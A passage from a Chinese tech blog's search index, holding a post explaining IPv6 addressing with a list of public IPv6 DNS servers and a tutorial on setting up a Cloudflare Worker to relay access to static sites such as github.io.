7</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python3 </tag>
            
            <tag> 编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPv6基本理解</title>
      <link href="/2020/12/23/Network/ipv6/"/>
      <url>/2020/12/23/Network/ipv6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文参考自<a href="https://www.cnblogs.com/gunxiaoshi/p/10336367.html">gunxiaoshi</a>, <a href="https://zhuanlan.zhihu.com/p/89688404">知乎-网络工程师</a>, <a href="https://www.cnblogs.com/zonkidd/p/15535173.html">Zonkidd</a>，有更改</p></blockquote><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>IPv6采用128位字长来表示IP地址，相比IPv4的32位，扩大了不止一点点地址空间。IPv6的产生是为了解决IPv4地址空间不足而提出的一种解决方案，早期也提出了NAT来提高IPv4的利用率，缓解了地址空间不足的问题，但始终是缓解，治标不治本。</p><h1 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h1><p><img src="/2020/12/23/Network/ipv6/ipv4frame.png" alt="IPv4报文格式"></p><p><img src="/2020/12/23/Network/ipv6/ipv6frame.png" alt="IPv6报文格式"></p><h1 id="IPv6地址分类"><a href="#IPv6地址分类" class="headerlink" title="IPv6地址分类"></a>IPv6地址分类</h1><p>在RFC3513中定义了IPV6寻址架构。定义了3种类型的IPV6地址：</p><ul><li>单播：标识单个节点，目的地为单播地址的流量被转发到单个节点；</li><li>组播：标识一组节点，目的地为组播（多播）地址的流量被转发到组里的所有节点；</li><li>任意播：标识一组节点，目的地为任意播地址的流量被转发到组里的最近节点。<br>在IPV4中给出了所有这些地址类型，其中还包括广播地址。广播流量被证明是太耗费资源的（在常规操作中以及广播风景中），因此IPv6没有任何广播地址，仅使用组播地址。</li></ul><h2 id="单播地址"><a href="#单播地址" class="headerlink" title="单播地址"></a>单播地址</h2><h3 id="全局单播地址"><a href="#全局单播地址" class="headerlink" title="全局单播地址"></a>全局单播地址</h3><p>这是典型的可路由的公有地址，这种地址在全球的路由器间可以路由，与IPV4中的单播地址相同。全局地址以2000::&#x2F;3打头。</p><p>地址范围：</p><p>2000::&#x2F;3 -&gt; </p><p>2000:: ~ 3fff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</p><h3 id="链路本地地址"><a href="#链路本地地址" class="headerlink" title="链路本地地址"></a>链路本地地址</h3><p>类似于IPV4私有地址（例如windows DHCP失败出现的169开头的地址），是不可路由的，它们以FE80::&#x2F;10打头。一般情况下，他们不可跨越路由，但是可以在二层直连网络中通信。可将它们视为一种便利的工具，让你能够为召开会议而组建临时LAN，或创建小型LAN，这些LAN不与因特网相连，但需要在本地共享文件和服务。</p><p>地址范围：</p><p>fe80::&#x2F;10 -&gt; </p><p>fe80:: ~ febf:ffff:ffff:ffff:ffff:ffff:ffff:ffff</p><h3 id="唯一本地地址"><a href="#唯一本地地址" class="headerlink" title="唯一本地地址"></a>唯一本地地址</h3><p>这些地址也是不可在因特网路由的，但也基本上是全局唯一的，因此不太可能重复使用它们。唯一的本地地址设计用于替代场点本地地址，因此它们的功能几乎与IPV4内网地址相同：支持在整个场点内通信，可路由到多个本地网络。</p><blockquote><p>场点本地地址已于2004年9月废除。 </p></blockquote><p>地址范围：</p><p>fc00::&#x2F;7 -&gt; </p><p>fc00:: ~ fdff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</p><h3 id="默认地址"><a href="#默认地址" class="headerlink" title="默认地址"></a>默认地址</h3><p>0:0:0:0:0:0:0:0 (::) 相当于IPv4地址：0.0.0.0，通常在使用有状态DHCP配置时，用作主机的源地址。</p><h3 id="环回地址"><a href="#环回地址" class="headerlink" title="环回地址"></a>环回地址</h3><p>0:0:0:0:0:0:0:1 (::1) 相当于IPv4地址127.0.0.1。</p><h3 id="IPv4兼容地址"><a href="#IPv4兼容地址" class="headerlink" title="IPv4兼容地址"></a>IPv4兼容地址</h3><p>0:0:0:0:0:0:w.x.y.z或::w.x.y.z（其中w.x.y.z是点分十进制的IPv4地址）。</p><blockquote><p>在RFC4291中已经不推荐使用这类地址</p></blockquote><h3 id="IPv4映射地址"><a href="#IPv4映射地址" class="headerlink" title="IPv4映射地址"></a>IPv4映射地址</h3><p>0:0:0:0:0:FFFF:w.x.y.z或::FFFF:w.x.y.z（其中w.x.y.z是点分十进制的IPv4地址），用于IPv6地址表示IPv4地址。主要用于某些场景下IPv6节点与IPv4节点通信。</p><h3 id="其他特定过渡技术地址"><a href="#其他特定过渡技术地址" class="headerlink" title="其他特定过渡技术地址"></a>其他特定过渡技术地址</h3><p>6to4地址、ISATAP地址、Teredo地址主要用于对应的过渡技术的地址</p><h2 id="组播地址"><a href="#组播地址" class="headerlink" title="组播地址"></a>组播地址</h2><p>与IPv4中一样，目标地址为组播地址的分组被传输到该组播地址表示的所有接口。这种地址有时也被称为一对多地址。IPv6组播地址很容易识别，它们总是以FF打头。</p><p>地址范围：</p><p>ff00::&#x2F;8 -&gt; </p><p>ff00:: ~ ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</p><h2 id="任播地址"><a href="#任播地址" class="headerlink" title="任播地址"></a>任播地址</h2><p>与组播地址一样，任意播地址也标识多个设备的多个接口，但有一个很大的差别：任意播分组只被传输到一个接口――根据路由选择距离确定的最近接口。这种地址的特殊之处在于，可将单个任意播地址分配给多个接口。这种地址被称为“一对最近”地址。</p><h1 id="IPv6地址生成"><a href="#IPv6地址生成" class="headerlink" title="IPv6地址生成"></a>IPv6地址生成</h1><h2 id="地址格式"><a href="#地址格式" class="headerlink" title="地址格式"></a>地址格式</h2><table><thead><tr><th align="center">全局路由前缀</th><th align="center">子网ID</th><th align="center">接口ID</th></tr></thead><tbody><tr><td align="center">48位</td><td align="center">16位</td><td align="center">64位</td></tr></tbody></table><blockquote><p>位数由RFC4291中定义</p></blockquote><p>ipv6地址一共128位，用十六进制表示，中间用“:”隔开，每一部分是16位。网络区段划分只有一种表示，称为前缀：</p><p>ip-&gt;234e:0:4567::3d &#x2F; 64</p><p>ipv6的地址，同一ip可以有多种表示形式，不过意义都是一样的，后面的前缀“64”表示128位中的前64位表示网络位，后面的64位表示主机位，只要ip的前64位一样，就说明子网一样，ipv6默认的前缀是64。</p><h2 id="IEEE-EUI64"><a href="#IEEE-EUI64" class="headerlink" title="IEEE EUI64"></a>IEEE EUI64</h2><h3 id="构造原则"><a href="#构造原则" class="headerlink" title="构造原则"></a>构造原则</h3><p>将48bit的MAC地址扩展到64bit构成接口ID。</p><h3 id="MAC地址规则"><a href="#MAC地址规则" class="headerlink" title="MAC地址规则"></a>MAC地址规则</h3><p>MAC地址（48bit）由两部分组成，前24bit叫做<code>OUI</code>，由IEEE全球统一指定[ps]；后24bit叫做<code>NIC</code>，由厂商针对设备唯一指定。</p><blockquote><p>[ps] Wireshark解析mac地址时出现的厂商名称就是依照IEEE标准。第7位称为U&#x2F;L位，表示此地址是全球管理还是本地管理。全球管理 &#x3D; 0，本地管理 &#x3D; 1。第8位称为I&#x2F;G位，表示此地址是单播地址还是组播地址。单播地址 &#x3D; 0，组播地址 &#x3D; 1。</p></blockquote><h3 id="生成算法"><a href="#生成算法" class="headerlink" title="生成算法"></a>生成算法</h3><p>gen_id &#x3D; (OUI + ‘\xfffe’ + NIC) ^ ‘0000 0010 0….0’</p><p>简记：MAC正中间插入FFFE，第七比特翻转。</p><h2 id="接口ID生成方式"><a href="#接口ID生成方式" class="headerlink" title="接口ID生成方式"></a>接口ID生成方式</h2><ul><li>根据RFC4291定义，接口ID可以从EUI-64地址生成（无状态自动生成）。</li><li>为了可以具备某种程度的匿名信，接口ID可以使用一个随机分配的，windows操作系统默认就是使用这种生成算法，Linux下也是默认开启这个算法。</li><li>使用状态化的自动配置技术分配，例如DHCPv6分配（有状态自动生成）。</li><li>手工配置。</li></ul><h2 id="IPv6在linux的协议栈"><a href="#IPv6在linux的协议栈" class="headerlink" title="IPv6在linux的协议栈"></a>IPv6在linux的协议栈</h2><p>Linux内核中，IPv6协议栈与IPv4协议栈并行关系。IPv6和IPv4完全是两套不一样的代码实现。IPv6完整的协议栈逻辑模块包括：</p><ul><li>网络层IPv6，核心逻辑：IPv6路由子系统</li><li>传输层TCP&#x2F;UDP实现：TCPv6、UDPv6</li><li>控制报文协议ICMPv6，这里值得一提的是ICMPv6在IPv6协议中的地位十分重要。ICMPv6不仅提供了与ICMPv4相同的服务诊断功能，例如报告数据包的错误和提供简单的echo服务，ICMPv6是IPv6中邻居发现协议的重要组成部分，用于管理链路上的点到点的通信。</li><li>邻居子系统的实现：邻居发现协议NDP（对应于IPv4里面的ARP协议）</li><li>其他高级实现（IPv6 NAT、IPv6隧道、iPv6 IPSec等）</li></ul><h2 id="生成过程"><a href="#生成过程" class="headerlink" title="生成过程"></a>生成过程</h2><p><img src="/2020/12/23/Network/ipv6/ipv6-addr-flow.png" alt="ipv6地址生成过程"></p><h2 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h2><h3 id="查看邻居缓存"><a href="#查看邻居缓存" class="headerlink" title="查看邻居缓存"></a>查看邻居缓存</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip -6 neighbor show <span class="comment"># linux</span></span><br><span class="line">netsh interface ipv6 show neighbors <span class="comment"># windows</span></span><br></pre></td></tr></table></figure><h1 id="附文"><a href="#附文" class="headerlink" title="附文"></a>附文</h1><p>DNSv6提供商和IP：</p><blockquote><p>参考自<a href="https://dns.icoa.cn/ipv6/">dns.icoa.cn</a></p></blockquote><table><thead><tr><th align="left">服务商</th><th align="left">描述</th><th align="left">DNS IP</th></tr></thead><tbody><tr><td align="left">阿里IPv6 DNS (Alidns)</td><td align="left">阿里云公共DNS已支持IPv6协议，成为国内首家向公众提供免费IPv4&#x2F;IPv6公共解析服务的提供商，最近也提供了DoT&#x2F;DoH服务器。</td><td align="left">2400:3200::1  2400:3200:baba::1</td></tr><tr><td align="left">腾讯DNSPod IPv6 DNS</td><td align="left">腾讯旗下的DNSPod最新提供了IPv6 DNS服务器，同时也提供了DoT&#x2F;DoH服务器，成为国内为数不多同时支持IPv4&#x2F;IPv6&#x2F;DoT&#x2F;DoH的DNS服务商。</td><td align="left">2402:4e00::</td></tr><tr><td align="left">百度IPv6 DNS</td><td align="left">百度在提供IPv4 DNS之后，也提供了IPv6 DNS服务器。</td><td align="left">2400:da00::6666</td></tr><tr><td align="left">中国电信IPv6 DNS</td><td align="left">如果用中国电信的宽带应该会自动分配这两个IP</td><td align="left">240e:4c:4008::1  240e:4c:4808::1</td></tr><tr><td align="left">中国联通IPv6 DNS</td><td align="left">如果用中国联通的宽带应该会自动分配这两个IP</td><td align="left">2408:8899::8  2408:8888::8</td></tr><tr><td align="left">中国移动IPv6 DNS</td><td align="left">中国移动宽带自动分配的两个IP</td><td align="left">2409:8088::a  2409:8088::b</td></tr><tr><td align="left">下一代互联网北京研究中心</td><td align="left">Yeti DNS Project注册的IPv6 DNS服务器</td><td align="left">240C::6666  240C::6644</td></tr><tr><td align="left">CNNIC IPv6 DNS 服务器</td><td align="left">由中国互联网信息中心CNNIC提供的免费公共DNS，同时支持IPv4和IPv6。</td><td align="left">2001:dc7:1000::1</td></tr><tr><td align="left">TWNIC IPv6 DNS Quad 101</td><td align="left">由台湾网络资讯中心提供的免费公共DNS，以台湾地区为人熟悉的地标台北101作为地址。同时支持IPv4和IPv6两个地址。</td><td align="left">2001:de4::101  2001:de4::102</td></tr><tr><td align="left">北京邮电大学IPv6 DNS服务器</td><td align="left"></td><td align="left">2001:da8:202:10::36  2001:da8:202:10::37</td></tr><tr><td align="left">上海交通大学IPv6 DNS服务器</td><td align="left"></td><td align="left">2001:da8:8000:1:202:120:2:100  2001:da8:8000:1:202:120:2:101</td></tr><tr><td align="left">中科院网络信息中心IPv6 DNS服务器</td><td align="left">Yeti DNS Project注册的IPv6 DNS服务器</td><td align="left">2001:cc0:2fff:1::6666</td></tr><tr><td align="left">北京交通大学IPv6 DNS服务器</td><td align="left">Yeti DNS Project注册的IPv6 DNS服务器</td><td align="left">2001:da8:205:2060::188</td></tr><tr><td align="left">清华大学IPv6 DNS服务器</td><td align="left">Yeti DNS Project注册的 IPv6 DNS服务器</td><td align="left">2001:da8:ff:305:20c:29ff:fe1f:a92a</td></tr><tr><td align="left">清华大学TUNA协会IPv6 DNS服务器</td><td align="left">据说已经停止对校外用户解析，未验证，可以自己试试看。</td><td align="left">2001:da8::666</td></tr><tr><td align="left">北京科技大学IPv6 DNS服务器</td><td align="left"></td><td align="left">2001:da8:208:10::6</td></tr><tr><td align="left">科技网IPv6 DNS服务器</td><td align="left"></td><td align="left">2001:cc0:2fff:2::6</td></tr><tr><td align="left">Global Public IPv6 DNS Server</td><td align="left">Google Public IPv6 DNS</td><td align="left">2001:4860:4860::8888  2001:4860:4860::8844</td></tr><tr><td align="left">Cloudflare IPv6 DNS</td><td align="left"></td><td align="left">2606:4700:4700::1111  2606:4700:4700::1001</td></tr><tr><td align="left">OpenDNS</td><td align="left"></td><td align="left">2620:0:ccc::2  2620:0:ccd::2</td></tr><tr><td align="left">Quad9 IPv6 DNS</td><td align="left">IBM发起的Quad9提供的公共免费IPv6 DNS.</td><td align="left">2620:fe::fe  2620:fe::9</td></tr><tr><td align="left">Neustar UltraDNS IPv6</td><td align="left">Neustar UltraDNS是美国信息服务公司Neustar提供的公共免费DNS服务.</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">基础版（快速可靠）</td><td align="left">2620:74:1b::1:1  2620:74:1c::2:2</td></tr><tr><td align="left"></td><td align="left">安全版（病毒和钓鱼防御）</td><td align="left">2610:a1:1018::2  2610:a1:1019::2</td></tr><tr><td align="left"></td><td align="left">家庭版（防成人内容）</td><td align="left">2610:a1:1018::3  2610:a1:1019::3</td></tr><tr><td align="left">DNS.SB</td><td align="left">德国的一个公共DNS服务商提供的DNS服务器（同时提供IPv4和IPv6）。</td><td align="left">2a09::  2a11::</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
          <category> IPv6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IPv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Cloudflare Workers中继访问静态资源</title>
      <link href="/2020/04/07/Network/cloudflare-worker/"/>
      <url>/2020/04/07/Network/cloudflare-worker/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>注意：</strong></p><ol><li>cloudflare workers的free计划每天有10万次请求上限，中小访问量基本上够用。</li><li>这个代码并不适合用于神奇网络，本意是用来加速访问静态网站和资源。</li></ol></blockquote><h1 id="注册cloudflare"><a href="#注册cloudflare" class="headerlink" title="注册cloudflare"></a>注册cloudflare</h1><p><a href="https://www.cloudflare.com/">cloudflare官网</a></p><h1 id="配置workers"><a href="#配置workers" class="headerlink" title="配置workers"></a>配置workers</h1><p>创建一个worker，使用默认代码即可，不需要使用预制模板：<br><img src="/2020/04/07/Network/cloudflare-worker/image0.png"><br><img src="/2020/04/07/Network/cloudflare-worker/image1.png"></p><p>可以根据个人喜好自定义项目名称，或者保持默认：<br><img src="/2020/04/07/Network/cloudflare-worker/image2.png"></p><p>添加后点击右上方<code>Edit Code</code>，进入代码编辑。它提供一个在线调试，将以下js代码复制到左边的代码区：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">fetch</span>(<span class="params">request, env, ctx</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> mappings = env.<span class="property">mappings</span>;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(request.<span class="property">url</span>);</span><br><span class="line">    <span class="keyword">let</span> mapping = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> mappings) &#123;</span><br><span class="line">      <span class="keyword">if</span> (url.<span class="property">host</span> === item.<span class="property">host</span> &amp;&amp; url.<span class="property">port</span> === item.<span class="property">port</span>) &#123;</span><br><span class="line">        mapping = item;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!mapping)</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;Access forbidden&quot;</span>, &#123; <span class="attr">status</span>: <span class="number">403</span> &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// request origin</span></span><br><span class="line">    url.<span class="property">host</span> = mapping.<span class="property">ohost</span>;</span><br><span class="line">    url.<span class="property">port</span> = mapping.<span class="property">oport</span>;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="keyword">new</span> <span class="title class_">Request</span>(url, request));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fix redirect location</span></span><br><span class="line">    <span class="keyword">if</span> (response.<span class="property">status</span> === <span class="number">301</span> || response.<span class="property">status</span> === <span class="number">302</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> locationHeader = response.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;Location&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (locationHeader) &#123;</span><br><span class="line">        <span class="keyword">const</span> locationURL = <span class="keyword">new</span> <span class="title function_">URL</span>(locationHeader);</span><br><span class="line">        <span class="keyword">if</span> (locationURL.<span class="property">host</span> === mapping.<span class="property">ohost</span> &amp;&amp; locationURL.<span class="property">port</span> === mapping.<span class="property">oport</span>) &#123;</span><br><span class="line">          locationURL.<span class="property">host</span> = mapping.<span class="property">host</span>;</span><br><span class="line">          locationURL.<span class="property">port</span> = mapping.<span class="property">port</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> newHeaders = <span class="keyword">new</span> <span class="title class_">Headers</span>(response.<span class="property">headers</span>);</span><br><span class="line">        newHeaders.<span class="title function_">set</span>(<span class="string">&#x27;Location&#x27;</span>, locationURL.<span class="title function_">toString</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(response.<span class="property">body</span>, &#123;</span><br><span class="line">          <span class="attr">status</span>: response.<span class="property">status</span>,</span><br><span class="line">          <span class="attr">statusText</span>: response.<span class="property">statusText</span>,</span><br><span class="line">          <span class="attr">headers</span>: newHeaders</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击右上角<code>Deploy</code>：<br><img src="/2020/04/07/Network/cloudflare-worker/image3.png"></p><p>返回到worker配置页进行<code>env</code>配置：<br><img src="/2020/04/07/Network/cloudflare-worker/image4.png"></p><p><code>Value</code>处根据自己的域名映射关系参照以下json，修改后填入：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span><span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;www.example.com&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;ohost&quot;</span><span class="punctuation">:</span> <span class="string">&quot;example2.github.io&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;oport&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span><span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test.example.com&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8443&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;ohost&quot;</span><span class="punctuation">:</span> <span class="string">&quot;example3.github.com&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;oport&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5443&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>这个json的意义是：</p><ul><li>当访问<code>https://www.example.com</code>时，worker中继访问<code>https://example2.github.io</code>；</li><li>当访问<code>https://test.example.com:8443</code>时，worker中继访问<code>https://example3.github.com:5443</code>。</li></ul><p>这是一个list，所以可以根据不同的映射需求配置多个。未配置的域名会返回<code>Access forbidden</code>。</p><h1 id="给workers配置个性化域名"><a href="#给workers配置个性化域名" class="headerlink" title="给workers配置个性化域名"></a>给workers配置个性化域名</h1><p>上面已经完成了workers配置，但是<code>workers.dev</code>目前存在DNS污染和SNI阻断，大部分地区无法正常访问，所以需要自定义域名。<strong>这个域名必须由cloudflare托管，否则无法完成添加。</strong><br><img src="/2020/04/07/Network/cloudflare-worker/image5.png"></p><p>有两种方式添加自定义域名，一种是域名模式<code>Custom domain</code>，这种最简单，根据上面json的域名自行添加即可，cloudflare会帮你自动完成后续配置，缺点是无法优选IP。</p><p>另一种是使用路由模式<code>Route</code>，稍微复杂：<br><img src="/2020/04/07/Network/cloudflare-worker/image6.png"></p><p>选择对应的Zone，Route中填入对应的通配URL（例如上述示例应填入<code>www.example.com/*</code>），然后在DNS记录中添加<code>www.example.com</code>的A&#x2F;AAAA记录或CNAME记录，解析到一个cloudflare优选IP。关于cloudflare优选IP请参考搜索引擎其他文章，有很多介绍。</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>访问<code>www.example.com</code>就可以达到透明访问<code>example2.github.io</code>的效果。常用于中继<code>github.io</code>或者<code>raw.githubusercontent.com</code>。</p>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
          <category> CDN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cloudflare </tag>
            
            <tag> github </tag>
            
            <tag> CDN </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
